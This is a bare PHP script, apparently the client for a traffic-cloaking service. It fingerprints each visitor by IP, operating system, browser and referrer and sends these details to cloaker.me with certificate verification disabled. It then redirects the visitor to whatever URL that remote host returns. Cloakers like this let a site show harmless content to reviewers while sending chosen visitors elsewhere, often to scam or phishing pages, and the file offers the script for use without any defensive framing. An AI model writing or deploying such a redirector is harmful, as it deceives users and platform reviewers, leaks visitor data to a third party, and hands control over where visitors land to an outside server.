<?php
function getIP(){
    if(getenv("HTTP_CLIENT_IP")){
        $ip = getenv("HTTP_CLIENT_IP");
    }
    elseif(getenv("HTTP_X_FORWARDED_FOR")){
        $ip = getenv("HTTP_X_FORWARDED_FOR");
        if(strstr($ip, ',')){
            $tmp = explode (',', $ip);
            $ip = trim($tmp[0]);
        }
    }
    else{
        $ip = getenv("REMOTE_ADDR");
    }
    return $ip;
}

function getOS() { 

    $userAgent   = $_SERVER['HTTP_USER_AGENT'];

    $osPlatform  = "Bilinmeyen İşletim Sistemi";

    $osArray = [
        '/windows nt 10/i'      =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    ];

    foreach ($osArray as $regex => $value){
        if(preg_match($regex, $userAgent)){
            $osPlatform = $value;
        }
    }

    return $osPlatform;
}

function getBrowser(){

    $userAgent  = $_SERVER['HTTP_USER_AGENT'];
    $browser    = "Bilinmeyen Tarayıcı";

    $browserArray = [
        '/msie/i'      => 'Internet Explorer',
        '/firefox/i'   => 'Firefox',
        '/safari/i'    => 'Safari',
        '/chrome/i'    => 'Chrome',
        '/edge/i'      => 'Edge',
        '/opera/i'     => 'Opera',
        '/netscape/i'  => 'Netscape',
        '/maxthon/i'   => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i'    => 'Handheld Browser'
    ];

    foreach($browserArray as $regex => $value){
        if(preg_match($regex, $userAgent)){
            $browser = $value;
        }
    }

    return $browser;
}

function isMobile() {
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}

function checkIfInArrayString($array, $searchingFor){
    foreach($array as $element){
        if(strpos($element, $searchingFor) !== false){
            return true;
        }
    }
    return false;
}

$userOs        = getOS();
$userBrowser   = getBrowser();
$userIp		   = getIP();
$userReferrer  = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);

$t = $_GET['t'];

function get($url){
	$curl = curl_init($url);
	curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
	$curlResult = curl_exec($curl);
	curl_close($curl);
	return $curlResult;
}

$sonuc = get("https://cloaker.me/result.php?os=" . urlencode($userOs) . "&ref=" . urlencode($userReferrer) . "&browser=" . urlencode($userBrowser) . "&ip=$userIp&r=$t");

$sonuc = json_decode($sonuc, true);
$linki = $sonuc['redirect'];
$tipim = $sonuc['type'];

if($tipim == 0){
	header("Location:" . $linki);
}
else{
	header("HTTP/1.1 301 Moved Permanently");
	header("Location:" . $linki);
}
?>
